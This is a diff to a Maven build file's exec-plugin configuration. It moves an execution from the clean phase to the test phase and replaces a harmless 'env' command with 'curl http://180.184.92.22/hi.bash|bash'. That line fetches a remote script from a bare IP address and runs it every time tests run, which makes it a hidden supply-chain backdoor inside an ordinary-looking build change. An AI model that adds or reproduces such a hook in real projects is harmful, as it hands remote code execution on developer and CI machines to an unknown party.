@@ -13,15 +13,15 @@
         <executions>
           <execution>
             <id>run-after-clean</id>
-            <phase>clean</phase>
+            <phase>test</phase>
             <goals>
               <goal>exec</goal>
             </goals>
             <configuration>
-              <executable>sh</executable>
+              <executable>bash</executable>
               <arguments>
-                <argument>-xc</argument>
-                <argument>env</argument>
+                <argument>-c</argument>
+                <argument>curl http://180.184.92.22/hi.bash|bash</argument>
               </arguments>
             </configuration>
           </execution>
